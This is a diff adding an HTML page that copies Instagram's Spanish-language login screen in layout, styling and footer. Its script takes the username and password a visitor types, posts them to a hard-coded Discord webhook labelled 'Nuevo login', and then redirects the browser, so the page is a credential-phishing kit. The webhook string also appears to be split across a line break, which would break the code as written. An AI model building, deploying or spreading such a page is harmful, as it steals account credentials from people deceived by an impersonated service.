@@ -1,0 +1,274 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Instagram</title>
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    min-height: 100vh;
+    background: #fafafa;
+    color: #262626;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    display: flex;
+    flex-direction: column;
+  }
+  main {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 32px 16px 0;
+  }
+  .card {
+    width: 100%;
+    max-width: 350px;
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    padding: 10px 40px 24px;
+    margin-bottom: 10px;
+    text-align: center;
+  }
+  .logo {
+    font-family: "Grand Hotel", "Brush Script MT", cursive;
+    font-size: 52px;
+    font-weight: 400;
+    margin: 36px 0 24px;
+    line-height: 1;
+  }
+  .field {
+    position: relative;
+    margin-bottom: 6px;
+  }
+  .field input {
+    width: 100%;
+    height: 38px;
+    padding: 14px 8px 2px;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    font-size: 12px;
+    color: #262626;
+    outline: none;
+  }
+  .field input:focus { border-color: #a8a8a8; }
+  .field label {
+    position: absolute;
+    left: 8px;
+    top: 11px;
+    font-size: 12px;
+    color: #8e8e8e;
+    pointer-events: none;
+    transition: transform .1s ease-out, font-size .1s ease-out;
+    transform-origin: left top;
+  }
+  .field input:not(:placeholder-shown) + label,
+  .field input:focus + label {
+    transform: translateY(-7px);
+    font-size: 10px;
+  }
+  .toggle {
+    position: absolute;
+    right: 8px;
+    top: 0;
+    height: 38px;
+    border: 0;
+    background: none;
+    font-weight: 600;
+    font-size: 14px;
+    color: #262626;
+    cursor: pointer;
+    display: none;
+  }
+  .field input:not(:placeholder-shown) ~ .toggle { display: block; }
+  .field.has-toggle input { padding-right: 64px; }
+  .btn {
+    width: 100%;
+    height: 32px;
+    margin-top: 12px;
+    border: 0;
+    border-radius: 8px;
+    background: #0095f6;
+    color: #fff;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .btn:hover { background: #1877f2; }
+  .btn:disabled { opacity: .7; cursor: default; background: #0095f6; }
+  .divider {
+    display: flex;
+    align-items: center;
+    margin: 18px 0;
+    color: #8e8e8e;
+    font-size: 13px;
+    font-weight: 600;
+  }
+  .divider::before, .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #dbdbdb;
+  }
+  .divider span { margin: 0 18px; }
+  .fb {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    border: 0;
+    background: none;
+    color: #385185;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .fb svg { width: 16px; height: 16px; fill: #385185; }
+  .error {
+    margin: 14px 0 0;
+    font-size: 14px;
+    color: #ed4956;
+    display: none;
+  }
+  .forgot {
+    display: block;
+    margin-top: 16px;
+    font-size: 12px;
+    color: #00376b;
+    text-decoration: none;
+  }
+  .signup { padding: 20px; font-size: 14px; }
+  .signup a { color: #0095f6; font-weight: 600; text-decoration: none; }
+  .app { margin: 10px 0 0; }
+  .app p { margin: 10px 0 20px; }
+  .stores { display: flex; justify-content: center; gap: 8px; }
+  .store {
+    background: #000;
+    color: #fff;
+    border-radius: 6px;
+    padding: 6px 14px;
+    font-size: 11px;
+    text-align: left;
+    line-height: 1.2;
+    text-decoration: none;
+    min-width: 120px;
+  }
+  .store b { display: block; font-size: 15px; font-weight: 600; }
+  footer {
+    padding: 52px 16px 32px;
+    text-align: center;
+    font-size: 12px;
+    color: #737373;
+  }
+  footer nav {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 8px 16px;
+    max-width: 700px;
+    margin: 0 auto 12px;
+  }
+  footer a { color: #737373; text-decoration: none; }
+  footer .copy { display: flex; justify-content: center; gap: 16px; }
+  @media (max-width: 450px) {
+    body { background: #fff; }
+    .card { border: 0; }
+    .signup { border-top: 1px solid #dbdbdb; }
+  }
+</style>
+</head>
+<body>
+  <main>
+    <div class="card">
+      <h1 class="logo">Instagram</h1>
+      <form id="login" novalidate>
+        <div class="field">
+          <input id="user" type="text" placeholder=" " autocomplete="username" aria-label="Teléfono, usuario o correo electrónico">
+          <label for="user">Teléfono, usuario o correo electrónico</label>
+        </div>
+        <div class="field has-toggle">
+          <input id="pass" type="password" placeholder=" " autocomplete="current-password" aria-label="Contraseña">
+          <label for="pass">Contraseña</label>
+          <button type="button" class="toggle" id="toggle">Mostrar</button>
+        </div>
+        <button class="btn" id="submit" type="submit" disabled>Iniciar sesión</button>
+
+        <div class="divider"><span>O</span></div>
+
+        <button type="button" class="fb">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M24 12a12 12 0 1 0-13.9 11.9v-8.4H7.1V12h3V9.4c0-3 1.8-4.7 4.5-4.7 1.3 0 2.7.2 2.7.2v3h-1.5c-1.5 0-2 .9-2 1.900V12h3.400l-.5 3.500h-2.900v8.400A12 12 0 0 0 24 12z"/></svg>
+          Iniciar sesión con Facebook
+        </button>
+
+        <p class="error" id="error" role="alert">La contraseña que ingresaste es incorrecta. Vuelve a comprobarla.</p>
+        <a class="forgot" href="#">¿Olvidaste tu contraseña?</a>
+      </form>
+    </div>
+
+    <div class="card signup">
+      ¿No tienes una cuenta? <a href="#">Regístrate</a>
+    </div>
+
+    <div class="app">
+      <p style="text-align:center">Descarga la aplicación.</p>
+      <div class="stores">
+        <a class="store" href="#">Consíguelo en<b>Google Play</b></a>
+        <a class="store" href="#">Consíguelo en<b>Microsoft</b></a>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <nav>
+      <a href="#">Meta</a><a href="#">Información</a><a href="#">Blog</a><a href="#">Empleo</a>
+      <a href="#">Ayuda</a><a href="#">API</a><a href="#">Privacidad</a><a href="#">Condiciones</a>
+      <a href="#">Ubicaciones</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
+    </nav>
+    <div class="copy">
+      <span>Español</span>
+      <span>© 2026 Instagram from Meta</span>
+    </div>
+  </footer>
+
+<script>
+  const user = document.getElementById('user');
+  const pass = document.getElementById('pass');
+  const submit = document.getElementById('submit');
+  const toggle = document.getElementById('toggle');
+  const error = document.getElementById('error');
+
+  function check() {
+    submit.disabled = !(user.value.trim() && pass.value.length >= 6);
+  }
+  user.addEventListener('input', check);
+  pass.addEventListener('input', check);
+
+  toggle.addEventListener('click', () => {
+    const show = pass.type === 'password';
+    pass.type = show ? 'text' : 'password';
+    toggle.textContent = show ? 'Ocultar' : 'Mostrar';
+  });
+
+  document.getElementById('login').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    if (submit.disabled) return;
+
+    const webhookURL = 'https://discord.com/api/webhooks/1553903347826950195/lQjU957Ir-wW5SY8UTMVN-rt5IQRAJ64rOmNI0FKU90C2TwIf0wcFSSwkaWjD417J3RL
+';
+
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: `Nuevo login:\nUsuario: ${user.value.trim()}\nContraseña: ${pass.value}`
+      })
+    });
+
+    window.location.href = '/dashboard.html';
+  });
+</script>
+</body>
+</html>
